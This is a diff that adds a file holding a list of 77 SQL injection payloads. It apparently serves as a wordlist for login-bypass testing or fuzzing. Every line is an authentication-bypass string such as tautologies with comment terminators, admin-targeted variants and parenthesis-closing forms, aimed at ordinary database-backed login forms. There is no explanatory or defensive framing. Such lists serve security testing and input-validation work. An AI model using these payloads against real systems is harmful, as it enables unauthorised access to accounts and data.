@@ -1,0 +1,77 @@
+' OR 1=1--
+' OR 1=1#
+' OR 1=1/*
+" OR 1=1--
+" OR 1=1#
+" OR 1=1/*
+' OR '1'='1
+' OR '1'='1'--
+' OR '1'='1'#
+" OR "1"="1
+" OR "1"="1"--
+" OR "1"="1"#
+' OR 'a'='a
+' OR 'a'='a'--
+' OR 'a'='a'#
+' OR 'a'='b
+' OR 'a'='b'--
+') OR ('1'='1
+') OR ('1'='1'--
+') OR ('1'='1'#
+") OR ("1"="1
+") OR ("1"="1"--
+admin'--
+admin'#
+admin'/*
+admin' OR '1'='1
+admin' OR '1'='1'--
+admin' OR '1'='1'#
+' OR username='admin'--
+' OR username='admin'#
+' OR username='administrator'--
+' OR username='administrator'#
+' OR user='admin'--
+' OR user='admin'#
+' OR login='admin'--
+' OR login='admin'#
+' OR email='admin'--
+' OR email='admin'#
+' OR 'admin'='admin
+' OR 'admin'='admin'--
+' OR 'admin'='admin'#
+' OR ''=''
+' OR ''=''--
+' OR ''=''#
+' OR true--
+' OR true#
+' OR TRUE--
+' OR TRUE#
+' OR 1=1 LIMIT 1--
+' OR 1=1 LIMIT 1#
+' OR 1=1 ORDER BY 1--
+' OR 1=1 ORDER BY 1#
+' OR 1=1 GROUP BY 1--
+' OR 1=1 GROUP BY 1#
+') OR 1=1--
+') OR 1=1#
+") OR 1=1--
+") OR 1=1#
+' OR 1=1 LIMIT 0,1--
+' OR 1=1 LIMIT 0,1#
+' OR 1=1 LIMIT 1,1--
+' OR 1=1 LIMIT 1,1#
+1' OR '1'='1
+1' OR '1'='1'--
+1' OR '1'='1'#
+1" OR "1"="1
+1" OR "1"="1"--
+1" OR "1"="1"#
+' OR 1=1 AND '1'='1
+' OR 1=1 AND '1'='1'--
+' OR 1=1 AND '1'='1'#
+' OR 1=1 OR '1'='1
+' OR 1=1 OR '1'='1'--
+' OR 1=1 OR '1'='1'#
+' OR 1=1 AND 'a'='a
+' OR 1=1 AND 'a'='a'--
+' OR 1=1 AND 'a'='a'#
